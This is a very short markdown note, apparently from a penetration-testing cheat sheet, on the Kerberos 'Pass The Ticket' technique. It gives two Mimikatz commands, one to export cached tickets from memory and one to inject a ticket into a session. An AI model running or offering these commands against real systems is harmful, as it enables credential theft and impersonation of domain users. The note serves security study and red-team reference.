# Pass The Ticket

**Pass The Ticket** is a lateral movement technique which uses existing Ticket Granting Service (TGS) to authenticate a service behalf of the victim.

#### extracting cached tickets.

```
sekurlsa::tickets /export
```

#### Passing the ticket.

```
kerberos::ptt ticket.kirbi
```

